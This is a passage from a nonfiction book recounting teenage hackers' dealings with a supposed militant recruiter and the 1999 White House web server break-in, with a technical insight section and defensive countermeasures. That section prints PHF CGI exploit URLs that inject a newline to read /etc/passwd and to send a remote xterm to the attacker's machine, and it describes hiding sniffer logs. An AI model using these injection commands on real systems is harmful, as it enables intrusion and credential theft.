honeymoon. He had been stabbed to death for the minor offense of
refusing to put on a blindfold. 
The plane eventually landed in Kandahar, Afghanistan — increasing the
likelihood of a Taliban connection. The remaining passengers and crew
were held on board for eight terror-filled days, and were ultimately
released in exchange for the release of three jailed militants. One of those
released, Sheikh Umer, would later play a role in aiding the financing of
Mohammed Atta, a leader of the 9/11 World Trade Center attacks.
After the hijacking, Khalid told ne0h that his group was responsible
and he himself had been involved. 
That scared me to death. He was a bad guy. I felt I had to cover
my ass.
But ne0h’s distress was tempered by boyish greed. “I still hoped he
would pay me my money,” he added.
The hijacking connection added fuel to a fire that Khalid had set ablaze
earlier. At one point, apparently annoyed by the teenagers’ lack of success
in providing the information he was asking for, Khalid had tried a high-
pressure tactic. Reporter Niall McKay, in the same story for Wired.com,
wrote of seeing an old IRC message from Khalid to the youngsters in
which he threatened to have them killed if they reported him to the FBI.
McKay wrote that he also saw a message from the Pakistani to the kids:
“I want to know: Did [anybody] tell the Feds about me?” And in another
place, “Tell them [if they did that], they are dead meat. I will have snipers
set on them.”2
Comrade Gets Busted
The situation was getting sticky, but it was about to get worse. A few days
after Comrade’s success in penetrating a system associated with SIPR-
NET, his father was pulled over on his way to work. The cops told him,
“We want to talk to your son,” and showed him a search warrant.
Comrade remembers:
There were some people from NASA, the DoD, the FBI. In all
there were like ten or twelve agents, and some cops, too. I had beenThe Art of Intrusion 3006_569597 ch02.qxd  1/11/05  9:24 PM  Page 30

messing around in some NASA boxes, I put a sniffer up on
ns3.gtra.mil, just to pick up passwords. But as a side effect, it
picked up emails as well. They told me I was being charged with
illegal wiretaps for that. And then for the NASA computers I got
copyright violations or infringement. And other things.
Just the day before, a friend said, “Dude, we’re going to get
busted soon.” He was flipping out. I figured, “Yeah, he’s got a
point.” So I wiped my hard drive.
But Comrade wasn’t thorough about the cleanup job. “I had forgot-
ten the old drives hanging around my desk.”
They questioned me. I admitted it, I said, “I’m sorry, here’s what
I did, here’s how to fix it, I won’t do it again.” They were like,
“All right, we don’t consider you a criminal, don’t do it again.
If you do it again, you’ll leave in handcuffs.” They packed up my
computers, peripherals, and spare hard drives, and they left.
Later on they tried to get Comrade to tell them the password to his
encrypted hard drives. When he wouldn’t tell, they said they knew how
to crack the passwords. Comrade knew better: He had used PGP (Pretty
Good Privacy) encryption and his password was “about a hundred char-
acters long.” Yet he insists it’s not hard to remember — it’s three of his
favorite quotes strung together.
Comrade didn’t hear anything more from them for about six months.
Then one day he got word that the government was going to press charges.
By the time he got to court, he was being nailed for what the prosecutor
claimed was a three-week shutdown of NASA computers and intercepting
thousands of email messages within the Department of Defense.
(As I know all too well, the “damage” claimed by prosecutors and the
real-life damage are sometimes quite different. Comrade downloaded
software from the NASA’s Marshall Space Flight Center in Alabama, used
in controlling the temperature and humidity of the International Space
Station; the government claimed that this had forced a three-week shut-
down of certain computer systems. The Department of Defense attack
offered more realistic cause for concern: Comrade had broken into the
computer system of the Defense Threat Reduction Agency and installed
a “back door” allowing him access at any time.) 
The government obviously considered the case important as a warning
to other teenage hackers, and made much of his conviction in the press,
proclaiming him the youngest person ever convicted of hacking as a fed-
eral crime. Attorney General Janet Reno even issued a statement that said
in part, “This case, which marks the first time a juvenile hacker will serveChapter 2 When Terrorists Come Calling
 3106_569597 ch02.qxd  1/11/05  9:24 PM  Page 31

time in a detention facility, shows that we take computer intrusion seri-
ously and are working with our law enforcement partners to aggressively
fight this problem.”
The judge sentenced Comrade to six months in jail followed by six
months probation, to start after the end of the school semester.
Comrade’s mother was still alive at the time; she hired a new lawyer, got
a lot of letters written, presented the judge what Comrade calls “a whole
new case,” and, incredibly, managed to get the sentence reduced to
house arrest followed by four years of probation. 
Sometimes in life we don’t make the best of opportunities. “I did the
house arrest and was going through probation. Various things happened,
I started partying too much, so they sent me to rehab.” Back from rehab,
Comrade got a job with an Internet company and started his own
Internet outfit. But he and his probation officer weren’t seeing eye to eye
and Comrade was sent to prison after all. He was just 16 years old, incar-
cerated for acts he committed at age 15.
There aren’t all that many juveniles in the federal system; the place he
was sent turned out to a “camp” (apparently an appropriate word) in
Alabama that housed only 10 prisoners and that Comrade describes as
looking “more like a school — locked doors and razor wire fences but
otherwise not much like a jail.” He didn’t even have to go to class
because he had already finished high school. 
Back in Miami and again on probation, Comrade was given a list of
hackers he would not be allowed to talk to. “The list was like this guy,
this guy, and ne0h.” Just “ne0h” — the federal government knew him
only by his handle. “They had no idea who he was. If I had access to two
hundred things, he had access to a thousand things,” Comrade says.
“ne0h was pretty slick.” As far as either of them knows, law enforcement
still hasn’t managed to pin a name on him or pinpoint his location.
Investigating Khalid
Was Khalid the militant he claimed to be, or just some faker pulling the
chains of the teenagers? Or maybe an FBI operation to probe how far the
young hackers were willing to go? At one time or another, each of the
hackers who had dealings with Khalid were suspicious that he wasn’t
really a militant; the idea of providing information to a foreign agent
seems to have bothered them a good deal less than the idea the guy
might be duping them. Comrade said that he “wondered for the longest
time what [Khalid] was. I didn’t know if he was a Fed or if he was for
real. Talking to ne0h and talking to him, I decided he was pretty legit.
But I never took money from him — that was a barrier I didn’t want to
cross.” (Earlier in the conversation, when he had first mentioned theThe Art of Intrusion 3206_569597 ch02.qxd  1/11/05  9:24 PM  Page 32

offer of $10,000 from Khalid, he had sounded impressed by the sum.
Would he really have declined the money if his efforts had been successful
and Khalid had actually paid up? Perhaps even Comrade himself doesn’t
really know the answer to that one.) 
ne0h says that Khalid “sounded absolutely professional” but admits to
having had doubts along the way about whether he was really a militant.
“The whole time I was talking to him, I thought he was full of shit. But
after researching with friends who he’s contacted and given other infor-
mation to, we actually think he really was who he said he was.
Another hacker, Savec0re, encountered someone on IRC who said that
he had an uncle in the FBI who could arrange immunity for an entire
hacker group called Milw0rm. “I thought that this would send a message
to the FBI that we weren’t hostile,” Savec0re told journalist McKay in an
email interview. “So I gave him my phone number. The next day I got a
call from the so-called FBI agent, but he had an amazingly strong
Pakistani accent.”
“He said his name was Michael Gordon and that he was with the FBI in
Washington, DC,” Savec0re told the journalist. “I realized then that it had
been Ibrahim all along.” While some people were wondering if the sup-
posed terrorist might be an FBI sting, Savec0re was reaching the opposite
conclusion: that the guy claiming to be an FBI agent was really the same
terrorist, trying to see if the boys were willing to blow the whistle on him.
The notion that this might have been an FBI operation doesn’t seem
to stand up. If the federal government wanted to find out what these kids
were capable of and willing to do, money would have been flowing.
When the FBI thinks a situation is serious enough to run a sting, they put
money behind the effort. Promising $1,000 to ne0h and then not pay-
ing it wouldn’t make any sense. 
Apparently only one hacker actually saw any money from Khalid:
Chameleon. “I went to my post-office box one morning, and there was
a check for a thousand dollars with a number to call in Boston,”
Chameleon was quoted as saying in another Wired News story
(November 4, 1998). Khalid understood he had maps of government
computer networks; the check was payment for the maps. Chameleon
cashed the check. Two weeks later he was raided by the FBI and interro-
gated about the payment, raising the interesting question of how the
government knew about the thousand dollars. This was before 9/11,
when the FBI was focused on domestic crime and paying scant attention
to the terrorist threat. Chameleon admitted taking the money but
insisted to the Wired News journalist that he had not provided any gov-
ernment network maps. Chapter 2 When Terrorists Come Calling
 3306_569597 ch02.qxd  1/11/05  9:24 PM  Page 33

Though he had confessed to accepting money from a foreign terrorist,
which could have brought a charge of espionage and the possibility of a
very long sentence, no charges were ever filed — deepening the mystery.
Perhaps the government just wanted word to spread in the hacker com-
munity that doing business with foreign agents could be risky. Perhaps
the check wasn’t from Khalid after all, but from the FBI.
Few people know Chameleon’s true identity, and he very much wants
to keep it that way. We wanted to get his version of the story. He refused
to talk about the matter (merely giving himself an out by mentioning he
thought Khalid was a Fed just posing as a terrorist). If I were in his posi-
tion, I probably wouldn’t want to be interviewed on the subject either. 
The Harkat ul-Mujahideen
While searching the Internet Relay Chat logs, reporter McKay found that
Khalid had at one point described himself to the young hackers as a mem-
ber of Harkat-ul-Ansar.3According to the South Asia Intelligence Review ,
“the Harkat-ul-Ansar was termed a terrorist organization by the US due
to its association with the exiled Saudi terrorist Osama bin Laden in
1997. To avoid the repercussions of the US ban, the group was recast as
the Harkat ul-Mujahideen in 1998.”4
The U.S. Department of State has repeatedly warned about this group.
One item from State reads, “Pakistani officials said that a U.S. air raid on
October 23 [2001] had killed 22 Pakistani guerrillas who were fighting
alongside the Taliban near Kabul. The dead were members of the Harkat
ul-Mujaheddin ... [which] had been placed on the State Department’s
official list of terrorist organizations in 1995.”5
In fact, the Harkat is today one of the 36 groups designated by State
as foreign terrorist organizations. Our government, in other words, con-
siders them among the baddest actors on the face of the globe. 
The young hackers, of course, didn’t know this. To them, it was all a
game. 
As for Khalid, a major general of the Indian armed forces, giving an
address on the topic of information security in April 2002, confirmed
Khalid as a terrorist, telling his audience about hacker links with “Khalid
Ibrahim of Pakistani-based Harkat-ul-Ansar.”6The general seemed trou-
bled, however, that Khalid himself was based not in Pakistan but in the
general’s own country, at Delhi, India.
In the Aftermath of 9/11
Some hackers manipulate and deceive. They fool computer systems into
thinking they have authorization that they have in fact stolen; they practiceThe Art of Intrusion 3406_569597 ch02.qxd  1/11/05  9:24 PM  Page 34

social engineering to manipulate people in order to achieve their goals. All
of this means that when you talk to a hacker, you listen carefully to see if
what he’s telling you, and the way he’s saying it, suggest that he can be
believed. Sometimes you’re just not certain.
My coauthor and I weren’t certain about what ne0h told us of his reac-
tion to 9/11. We believe it just enough to share it:
Do you know how much I cried that day? I felt for sure my life
was over. 
This was accompanied by a curious nervous laugh — signifying what?
We couldn’t tell. 
To think that maybe I had something to do with it. If I had gone
into Lockheed Martin or Boeing and got more information, they
could have used that. It was a bad time for me and for America.
I cried because I never thought to report him. I didn’t use my best
judgment. That’s the reason he hired me to do all these things ...
If I had even a pinkie-finger of a hand into the Trade Center ...
[The thought] was absolutely devastating.
Actually I lost three friends in the World Trade Center; I never
felt so bad. 
Many hackers are in their teens or even younger. Is that too young to
recognize the potential danger of responding to requests from someone
who could pose a threat to our country? Personally, I’d like to think
9/11 has made American hackers — even very young ones — suspicious,
unlikely to be suckered by a terrorist. I just hope I’m right.
The White House Break-in
The history of computer security in one way parallels the ancient history
of cryptography. For centuries, code makers have devised ciphers that they
labeled “unbreakable.” Even today, in an age of computers that can read-
ily encrypt a message using a one-time pad, or a key containing hundreds
of characters, most codes are still breakable. (America’s code-making and
code-breaking organization, the National Security Agency, boasts a num-
ber of the world’s largest, fastest, most powerful computers.)
Computer security is like a constant cat-and-mouse game, with security
experts on one side and intruders on the other. The Windows operating
system contains lines of code numbering in the tens of millions. It’s a Chapter 2 When Terrorists Come Calling
 3506_569597 ch02.qxd  1/11/05  9:24 PM  Page 35

no-brainer that any software of massive size will inevitably contain vul-
nerabilities that dedicated hackers will eventually discover. 
Meanwhile, company workers, bureaucrats, sometimes even security
professionals will install a new computer or application and overlook the
step of changing the default password, or constructing one that’s rea-
sonably secure — leaving the device in a vulnerable state. If you read the
news of hacker attacks and break-ins, you already know that military and
government sites, and even the White House Web site, have already been
compromised. In some cases repeatedly.
Getting onto a site and defacing a Web page is one thing — most of the
time it’s essentially trivial, if annoying. Still, many people rely on a single
password for every use; if breaking into a Web site leads to capturing pass-
words, the attackers might be in position to gain access to other systems on
the network and do a great deal more damage. ne0h says that in 1999 he
and two other members of the hacker’s group gLobaLheLL did just that,
on one of the most sensitive spots in the United States: the White House.
I believe that the White House was doing a reinstall of their oper-
ating system. They had everything defaulted. And for that period
of ten, fifteen minutes, Zyklon and MostFearD managed to get
in, get the shadowed password file, crack it, enter, and change the
Web site. I was right there while they were doing it.
It was basically being at the right place at the right time. It was
just by chance, just a fluke that they happened to be on line just
when the site was being worked on.
We had discussed it in the gLobaLheLL chat room. I was woken
up by a phone call around 3 A.M. saying they were doing it. I
said, “Bullshit. Prove it.” I jumped on my computer. Sure enough,
they did it.
MostFearD and Zyklon did most of it. They gave me the shadow
file to crack as fast as I could. I got one [password] — a simple
dictionary word. That was about it.
ne0h provided a portion of what he says is the password file that the
others obtained and passed to him, listing what appears to be a few of the
authorized users on the White House staff7:

This is in the form of a Unix or Linux password file, the kind used when
the encrypted passwords are stored in a separate, protected file. Each line
lists the name of one person who has an account on the system. The entry
“sdshell” on some lines suggests that these users, for additional security,
were carrying a small electronic device called an RSA SecureID , which dis-
plays a six-digit number that changes every 60 seconds. To sign on, these
users must enter the six-digit number displayed at that moment on their
SecureID device along with a PIN number (which may be assigned in
some companies or self-chosen in others).The White House Web site was
defaced at the same time as the break-in, to show they had been there,
according to ne0h, who provided a link to the defacement (see Figure
2-1).8Besides bearing a symbol for the gLobaLheLL hacker group, the
message also includes a logo for the Hong Kong Danger Duo. That was,
ne0h says, a phony name made up to add an element of deception.
As ne0h remembers it, the guys responsible for this White House hack
didn’t feel any particular elation about having been able to break into
what should be among the half dozen or dozen most secure Web sites in
the nation. They were “pretty busy trying to break into everything,”
ne0h explained, “to prove to the world that we were the best.” Instead
of virtual pats on the back all around, it was, he says, more an attitude of
“Good job, guys, we finally got it, what’s next?” 
But they didn’t have much time left for other break-ins of any sort.
Their worlds were about to crumble, and that part of the tale brings the
story back around once again to the mysterious Khalid.Chapter 2 When Terrorists Come Calling

Figure 2-1: Defacement page on White 
House Web site, May 1999.
Zyklon, otherwise known as Eric Burns, takes over the narrative at this
point. He wasn’t ever actually a member of globaLheLL, he says, but did
hang around on IRC with some of the guys. In his description of events,
the White House hack became possible when he discovered the Web site
was susceptible to being compromised by exploiting a hole in a sample
program called PHF, which is used to access a Web-based phone book
database. This was a critical vulnerability, but although people in the hacker
community knew about it, “not many people were using it,” Zyklon says. 
Carrying out a number of steps (detailed in the Insight section at the
end of this chapter), he was able to gain root on whitehouse.gov and
establish access to other systems on the local network, including the White
House mail server. Zyklon at that point had the ability to intercept any
messages between White House staffers and the public, though of course
those messages would not have revealed any classified information.
But he was also, Zyklon says, able to “grab a copy of the password and
shadow files.” They hung around the site, seeing what they could find,
waiting until people started arriving for work. While he was waiting, he
received a message from Khalid, who said he was writing an article about
recent break-ins, and asking Zyklon if he had any recent exploits to tell
The Art of Intrusion 3806_569597 ch02.qxd  1/11/05  9:24 PM  Page 38

about. “So I told him we were right then into the White House Web
site,” Zyklon said.
Within a couple of hours of that exchange, Zyklon told me, they saw a
sniffer appear on the site — a system administrator was looking to see
what was going on and trying to track who the people were on the site.
Just coincidence? Or did he have some reason to be suspicious at that
particular moment? It would be months before Zyklon found out the
answer. For the moment, as soon as they spotted the sniffer, the boys
pulled the plug, got off the site, and hoped they had caught on to the
administrator before he had caught on to them.
But they had stirred up the proverbial hornet’s nest. About two weeks
later the FBI descended in force, rounding up every gLobaLheLL mem-
ber they had been able to identify. In addition to Zyklon — then 19,
arrested in Washington state — they also grabbed MostHateD (Patrick
Gregory, also 19, from Texas), and MindPhasr (Chad Davis, Wisconsin),
along with others. 
ne0h was among the few who survived the sweep. From the safety of
his remote location, he was incensed, and posted a Web site defacement
page with a message of defiance; as edited for prime time, it read: “Listen
up FBI m____ f_____ers. Don’t f___ with our members, you will loose.
we are holding fbi.gov as I type this. AND YOUR FEARING. We got

And he signed it: “the unmerciful, ne0h.”9
Aftermath
So how did that system administrator happen to be sniffing so early in the
morning? Zyklon doesn’t have any doubt about the answer. When the
prosecutors had drawn up the papers in his case, he found a statement that
information leading to knowledge of the gLobaLheLL break-in to the
White House site had been provided by an FBI informant. As he remem-
bers it, the paper also said that the informant was in New Delhi, India.
In Zyklon’s view, there isn’t any doubt. The only person he had told
about the White House break-in — the only person — was Khalid
Ibrahim. One plus one equals two: Khalid was an FBI informant.
But the mystery remains. Even if Zyklon is correct, is that the whole
story? Khalid was an informant, helping the FBI locate kid hackers will-
ing to conduct break-ins to sensitive sites? Or is there another possible
explanation: that his role as an informant was only half the story, and he
was in fact also the Pakistani terrorist that the Indian general believed heChapter 2 When Terrorists Come Calling
 3906_569597 ch02.qxd  1/11/05  9:24 PM  Page 39

was. A man playing a double role, helping the cause of the Taliban while
he infiltrated the FBI.
Certainly his fears about one of the kids reporting him to the FBI fit
this version of the story.
Only a few people know the truth. The question is, are the FBI agents
and federal prosecutors who were involved among those who know the
real story. Or were they, too, being duped?
In the end, Patrick Gregory and Chad Davis were sentenced to 26
months, and Zyklon Burns got 15 months. All three have finished serv-
ing their time and are out of prison.
Five Years Later
These days hacking is mostly just a memory for Comrade, but his voice
becomes more alive when he talks about “the thrill of doing shit you’re not
supposed to be doing, going places you’re not supposed to go, hoping to
come across something cool.”
But it’s time to get a life. He says he’s thinking about college. When
we spoke, he was just back from scouting schools in Israel. The language
wouldn’t be too much of a problem — he learned Hebrew in elementary
school and in fact was surprised at how much he remembered. 
His impressions of the country were mixed. The girls were “really
great” and the Israelis proved very fond of America. “They seem to look
up to Americans.” For example, he was with some Israelis who were
drinking a soft drink he had never heard of called RC Cola; it turned out
to be an American product. The Israelis explained, “On the commercials,
that’s what Americans drink.” He also encountered “some anti-American
vibes with people that don’t agree with the politics,” but took it in stride:
“I guess you get that anywhere.”
He hated the weather — “cold and rainy” while he was there. And then
there was the computer issue. He had bought a laptop and wireless espe-
cially for the trip, but discovered that “the buildings are build out of this
huge thick stone.” His computer could see 5 or 10 networks, but the sig-
nals were too weak to connect and had to walk 20 minutes to a place
where he could log on. 
So Comrade is back in Miami. A teenager with a felony on his rap
sheet, he’s now living on his inheritance, trying to decide about going to
college. He’s 20 years old, and not doing much of anything.
Comrade’s old buddy ne0h works for a major telecom company (a nine-
to-five job is “no good,” he says), but he’ll shortly be in Los Angeles for
three months on a manual labor job he took because the pay is so much
more than he’s making right now. Joining mainstream society, he hopesThe Art of Intrusion 4006_569597 ch02.qxd  1/11/05  9:24 PM  Page 40

to put away enough for a down payment on a house in the community
where he currently lives.
When the three-month high-paying drudgery is over, ne0h, too, talks
about starting college — but not to study computer science. “Most of
the people I’ve ever run into that have computer science degrees know
shit-all,” he says. Instead, he’d like to major in business and organiza-
tional management, then get into the computer field on a business level.
Talking about his old exploits brings up his Kevin fixation again. To
what extent did he imagine himself walking in my shoes? 
Did I want to get caught? I did and I didn’t. Being caught shows
“I can do it, I did it.” It’s not like I wanted to get caught on pur-
pose. I wanted to get caught so I would fight it, I would be
released, I would be the hacker that got away. I would get out, get
a good sound job with a government agency and I would fit right
in with the underground. 
How Great Is the Threat?
The combination of determined terrorists and fearless kid hackers could
be disastrous for this country. This episode left me wondering how many
other Khalids are out there recruiting kids (or even unpatriotic adults
with hacking skills) and who hunger after money, personal recognition,
or the satisfaction of successfully achieving difficult tasks. The post-
Khalid recruiters may be more secretive and not as easy to identify. 
When I was in pretrial detention facing hacking-related charges, I was
approached several times by a Columbian drug lord. He was facing life in
federal prison without the possibility of parole. He offered me a sweet
deal: I would be paid $5 million dollars in cash for hacking into
“Sentry” — the Federal Bureau of Prisons computer system — and
releasing him from custody. This guy was the real thing and deadly seri-
ous. I didn’t accept his offer, but I gave the impression I would help him
out to avoid any confrontation. I wonder what ne0h would have done in
a similar situation. 
Our enemies may well be training their soldiers in the art of cyber war-
fare to attack our infrastructure and defend their own. It seems like a no-
brainer that these groups would also recruit knowledgeable hackers from
anywhere in the world for training and for mission-critical projects. 
In 1997 and again in 2003, the Department of Defense launched
Operation Eligible Receiver — an effort to test the vulnerability of this
nation to electronic attack. According to an account published in the
Washington Times10about the earlier of these efforts, “Senior Pentagon
leaders were stunned by a military exercise showing how easy it is forChapter 2 When Terrorists Come Calling
 4106_569597 ch02.qxd  1/11/05  9:24 PM  Page 41

hackers to cripple U.S. military and civilian computer networks.” The
article goes on to explain that the National Security Agency assembled a
group of its computer specialists as a “red team” of hackers, allowed to
use only off-the-shelf computer equipment available to the public, along
with any hacking tools, including exploit code, they could download
from the Internet or electronic bulletin boards.
In a few days the red team hackers infiltrated the computer systems
controlling parts of the nation’s electric power grid and with a series of
commands could have turned sections of the country dark. “If the exer-
cise had been real,” the Christian Science Monitor reported, “they could
have disrupted the Department of Defense’s communication systems
(taking out most of the Pacific Command) and gained access to com-
puter systems aboard U.S. Navy vessels.”11
In my own personal experience, I was able to defeat security mechanisms
used by a number of Baby Bells to control access to telephone switches. A
decade ago, I had complete control over most switches managed by
Pacific Bell, Sprint, GTE, and others. Imagine the chaos that a resource-
ful terrorist group could have wreaked with the same level of access.
Members of Al Qaeda and other terrorist groups have a record of using
computer networks in planning terrorist acts. Evidence suggests that ter-
rorists made some use of the Internet in planning their operations for the
9/11 attacks. 
If Khalid Ibrahim was successful in getting information through any of
the young hackers, no one is acknowledging it. If he was really connected
with the attacks on the World Trade Center and the Pentagon, definitive
proof is missing. Yet no one knows when he or one of his kind will reap-
pear on the cyberspace scene, trolling for naive helpers who get a thrill
out of “doing shit you’re not supposed to be doing, going places you’re
not supposed to go.” Kids who might think that the challenge they’re
being offered is “cool.”
For young hackers, weak security remains a continuing invitation. Yet
the hackers in this story should have recognized the danger in a foreign
national recruiting them to compromise sensitive U.S. computer net-
works. I have to wonder how many other ne0hs have been recruited by
our enemies. 
Good security was never more important than in a world populated by
terrorists.
INSIGHT
ne0h provided us with details on how he hacked into the Lockheed
Martin computer systems. The story is a testimony both to the innovationThe Art of Intrusion 4206_569597 ch02.qxd  1/11/05  9:24 PM  Page 42

of hackers (“If there’s a flaw in the security, we’ll find it” might be the
hacker motto) and a cautionary tale for every organization.
He quickly determined that Lockheed Martin was running its own
Domain Name Servers. DNS, of course, is the Internet protocol that, for
example, translates (“resolves”) www.disney.com into 198.187.189.55, an
address that can be used to route message packets. ne0h knew that a secu-
rity research group in Poland had published what hackers call an exploit —
a program specifically design to attack one particular vulnerability — to
take advantage of a weakness in the version of the DNS that Lockheed was
running.
The company was using an implementation of the DNS protocols
called BIND (Berkeley Internet Name Domain). The Polish group had
found that one version of BIND was susceptible to a type of attack
involving a remote buffer overflow , and that version was the one being
used at Lockheed Martin. Following the method he had discovered
online, ne0h was able to gain root (administrative) privileges on both the
primary and secondary Lockheed DNS servers.
After gaining root, ne0h set out to intercept passwords and e-mail by
installing a sniffer program, which acts like a computer wiretap. Any traf-
fic being sent over the wire is covertly captured; the hacker usually sends
the data to be stored in a place where it will be unlikely to be noticed. To
hide the sniffer log, ne0h says, he created a directory with a name that
was simply a space, represented by three dots; the actual path he used was
“/var/adm/ ...” Upon a brief inspection, a system administrator might
overlook this innocuous item. 
This technique of hiding the sniffer program, while effective in many
situations, is quite simple; much more sophisticated methods exist for
covering a hacker’s tracks in a situation like this.
Before ever finding out if he would be able to penetrate further into the
Lockheed Martin network to obtain company confidential information,
ne0h was diverted to another task. Lockheed Martin’s sensitive files
remained safe.
For the White House hack, Zyklon says he initially ran a program called
a CGI (common gateway interface) scanner, which scans the target sys-
tem for CGI vulnerabilities. He discovered the Web site was susceptible
to attack using the PHF exploit, which takes advantage of a programmer
error made by the developer of the PHF (phone book) script. 
PHF is a form-based interface that accepts a name as input and looks up
the name and address information on the server. The script called a func-
tion escape_shell_cmd(), which was supposed to sanitize the input for any
special characters. But the programmer had left one character off his list,
the newline character. A knowledgeable attacker could take advantage ofChapter 2 When Terrorists Come Calling
 4306_569597 ch02.qxd  1/11/05  9:24 PM  Page 43

this oversight by providing input into the form that included the encoded
version (0x0a) of the newline character. Sending a string with this char-
acter tricks the script into executing any command that the attacker
chooses.
Zyklon typed into his browser the URL:
http://www.whitehouse.gov/cgi-bin/phf?Qalias=x%0a/bin/
cat%20/etc/passwd
With this, he was able to display the password file for whitehouse.gov.
But he wanted to gain full control over the White House Web server. He
knew it was highly likely that the X server ports would be blocked by the
firewall, which would prevent him from connecting to any of those serv-
ices on whitehouse.gov. So instead, he again exploited the PHF hole by
entering
http://www.whitehouse.gov/cgi-bin/phf?Qalias=x%0a/usr/
X11R6/bin/xterm%20-ut%20-display%20zyklons.ip.address:0.0
This caused an xterm to be sent from the White House server to a com-
puter under his control running an X server. That is, instead of connect-
ing to whitehouse.gov, in effect he was commanding the White House
system to connect to him. (This is only possible when the firewall allows
outgoing connections, which was apparently the case here.)
He then exploited a buffer overflow vulnerability in the system pro-
gram — ufsrestore. And that, Zyklon says, enabled him to gain root on
whitehouse.gov, as well as access to the White House mail server and
other systems on the network.
COUNTERMEASURES
The exploits of ne0h and Comrade described here raise two issues for all
companies.
The first is simple and familiar: Keep current on all the latest operating
system and application releases from your vendors. It’s essential to exer-
cise vigilance in keeping up with and installing any security-related
patches or fixes. To make sure this isn’t done on a hit-or-miss basis, all
companies should develop and implement a patch management program,
with the goal of alerting the appropriate personnel whenever a new patch
is issued on products the company uses — operating system software in
particular, but also application software and firmware. 
And when a new patch becomes available, it must be installed as soon
as possible — immediately, unless this would disrupt corporate opera-
tions; otherwise, at the earliest practical time. It’s not hard to understandThe Art of Intrusion 4406_569597 ch02.qxd  1/11/05  9:24 PM  Page 44

overworked employees who yield to the pressure of focusing on those
highly visible projects (installing systems for new workers, to give just one
example) and getting around to installing patches on a time-available
basis. But if the unpatched device is publicly accessible from the Internet,
that creates a very risky situation. 
Numerous systems are compromised because of the lack of patch man-
agement. Once a vulnerability is publicly disclosed, the window of expo-
sure is significantly increased until the vendor has released a patch that
fixes the problem, and customers have installed it. 
Your organization needs to make the installing of patches a high-priority
item, with a formal patch management process that reduces the window of
exposure as quickly as possible subject to the demands of not interfering
with critical business operations.
But even being vigilant about installing patches isn’t enough. ne0h says
that some of the break-ins in which he participated were accomplished
through the use of “zero-day” exploits — a break-in based on a vulnera-
bility that is not known to others outside a very small group of hacker bud-
dies. “Zero day” is the day they first exploit the vulnerability, and hence the
day the vendor and the security community first become aware of it. 
Because there is always a potential to be compromised by a zero-day
exploit, every organization using the flawed product is vulnerable until a
patch or workaround is released. So how do you mitigate the risk of this
exposure? 
I believe the only viable solution lies in using a defense in depth model.
We must assume that our publicly accessible computer systems will be
vulnerable to a zero-day attack at some point in time. Thus, we should
create an environment that minimizes the potential damage a bad guy
can do. One example, as mentioned earlier, is to place publicly accessible
systems on the DMZ of the company firewall. The term DMZ, borrowed
from the military/political abbreviation for demilitarized zone , refers to
setting up network architecture so that systems the public has access to
(Web servers, mail servers, DNS servers, and the like) are isolated from
sensitive systems on the corporate network. Deploying a network archi-
tecture that protects the internal network is one example of defense in
depth. With this arrangement, even if hackers discover a previously
unknown vulnerability and a Web server or mail server is compromised,
the corporate systems on the internal network are still protected by
another layer of security.
Companies can mount another effective countermeasure by monitor-
ing the network or individual hosts for activity that appears unusual or
suspicious. An attacker usually performs certain actions once he or she
has successfully compromised a system, such as attempting to obtainChapter 2 When Terrorists Come Calling
 4506_569597 ch02.qxd  1/11/05  9:24 PM  Page 45

encrypted or plaintext passwords, installing a back door, modifying con-
figuration files to weaken security, or modifying system, application, or
log files, among other efforts. Having a process in place that monitors for
these types of typical hacker behavior and alerts the appropriate staff to
these events can help with damage control.
On a separate topic, I’ve been interviewed countless times by the press
about the best ways to protect your business and your personal computer
resources in today’s hostile environment. One of my basic recommenda-
tions is to use a stronger form of authentication than static passwords.
You will never know, except perhaps after the fact, when someone else has
found out your password. 
A number of second-level sign-on techniques are available to be used
in combination with a traditional password, to provide much greater
security. In addition to RSA’s SecureID, mentioned earlier, SafeWord
PremierAccess offers passcode-generating tokens, digital certificates,
smart cards, biometrics, and other techniques.
The trade-offs of using these types of authentication controls are the
added cost and the extra layer of inconvenience for every user. It all
depends on what you’re trying to protect. Static passwords may be suffi-
cient for the LA Times Web site to protect its news articles. But would
you count on static passwords protecting the latest design specs for a new
commercial jetliner?
THEBOTTOM LINE
The stories in this book, as well as in the press, demonstrate the insecu-
rity of this nation’s computer systems and how vulnerable we are to an
attack. It seems as if few systems are truly secure.
In this age of terrorism, we clearly need to be doing a better job of
stitching up the holes. Episodes like the one recounted here raise an issue
we need to face: how easily the talents and knowledge of our own unwit-
ting teenagers can be turned against us to endanger our society. I believe
that school kids should be taught the principles of computer ethics start-
ing when they are being introduced to computing in elementary school. 
Recently I attended a presentation given by Frank Abagnale, the pro-
tagonist in the blockbuster film Catch Me If You Can. Frank had con-
ducted a survey of high school students across the country about the
ethical use of computers. Each student was asked whether he or she con-
sidered it acceptable behavior to crack the password of a fellow student.
Surprisingly, 48 percent of the surveyed students thought it was just fine.
With attitudes like this, it’s not hard to understand why people become
involved in this type of activity.The Art of Intrusion 4606_569597 ch02.qxd  1/11/05  9:24 PM  Page 46

If anyone has a suggestion of how to make young hackers less suscep-
tible to being recruited by our enemies, foreign and domestic, I wish he
or she would speak up and make his or her ideas known.

Chapter 3
The Texas Prison Hack
I don’t think there’s any one thing you can say to a youngster to make them
change, other than to have value in themselves, you know, and never take
the short road.
— William
Two young convicts, each doing extended time for murder, meet
on a blazing day in the concrete yard of a Texas prison and dis-
cover they share a fascination with computers. They team up
and become secret hackers right under the noses of watchful guards. 
All that is in the past. These days, William Butler gets into his car at
5:30 every weekday morning and begins the commute to work through
clogged Houston traffic. He considers himself a very lucky man even to
be alive. He’s got a steady girlfriend; he drives a shiny new car. And, he
adds, “I was recently rewarded with a $7,000 raise. Not bad.”
Like William, his friend Danny is also settled in life and holding down
a steady job doing computer work. But neither will ever forget the long,
slow years paying a hard price for their actions. Strangely, the time in
prison equipped them with the skills they’re now making such good use
of in “the free world.”
Inside: Discovering Computers
Prison is a shock to the newcomer. Arriving inmates are often dumped
together until the unruly and violent can be sorted out — a severe chal-
lenge to those trying to live by the rules. Surrounded by people who07_569597 ch03.qxd  1/11/05  9:36 PM  Page 49

might explode at any imagined challenge, even the meek have to hang
tough and stand up for themselves. William devised his own set of rules:
I basically lived how you had to live in there. I’m just 5’10” and
I was probably 255. But it wasn’t just about being big, it’s a
mindset that I was not a weak person and I was nobody to be
taken advantage of. I carried myself like that. Inside, if anybody
perceives any weakness, then they take advantage of it. I didn’t
lie, I didn’t chat about other people’s business, and don’t ask me
about my business because I’ll tell you to get f___ed.
Danny and I both did time on tough units. You know what I’m
saying — gladiator units, where you had to fight all the time. So
we didn’t give a shit about guards or nobody. We would fight at
